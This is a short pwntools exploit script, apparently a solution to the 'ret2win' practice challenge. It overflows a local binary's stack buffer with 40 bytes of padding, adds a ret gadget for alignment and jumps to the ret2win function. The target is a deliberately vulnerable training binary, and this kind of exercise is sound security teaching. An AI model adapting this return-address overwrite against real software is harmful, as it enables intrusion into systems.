#!/usr/bin/python3

from pwn import *

PROG_NAME = "./ret2win"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
# additional ret for 16 byte alignment
payload += p64(next(elf.search(asm('ret'))))
payload += p64(elf.symbols['ret2win'])

p.sendline(payload)

p.interactive()